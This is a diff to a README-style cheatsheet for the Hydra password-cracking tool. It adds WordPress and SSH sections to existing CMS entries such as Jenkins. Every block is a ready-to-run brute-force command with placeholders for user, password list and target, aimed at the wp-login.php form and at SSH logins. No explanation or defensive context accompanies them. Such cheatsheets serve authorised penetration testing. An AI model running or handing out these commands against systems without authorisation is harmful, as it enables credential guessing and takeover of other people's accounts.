@@ -1,6 +1,8 @@
 # hydra-cheatsheet
 Hydra cheatsheet for common CMS &amp; Services
 
+## CMS
+
 ### Jenkins
 ```
 sudo hydra -l [USERNAME] -P [PASSWORD_FILE] [TARGET] \
@@ -13,4 +15,16 @@ sudo hydra -l [USERNAME] -P [PASSWORD_FILE] [TARGET] \
 sudo hydra -l [USERNAME] -P [PASSWORD_FILE] [TARGET] \
 http-form-post '/blog/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' \
 -V
+```
+### Wordpress
+```
+sudo hydra -l [USERNAME] -P [PASSWORD_FILE] [TARGET] \
+http-form-post '/blog/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' \
+-V
+```
+
+## Services
+### SSH
+```
+hydra -s [PORT] -l [USERNAME] -P [PASSWORD_FILE] [TARGET] -t 4 ssh
 ```
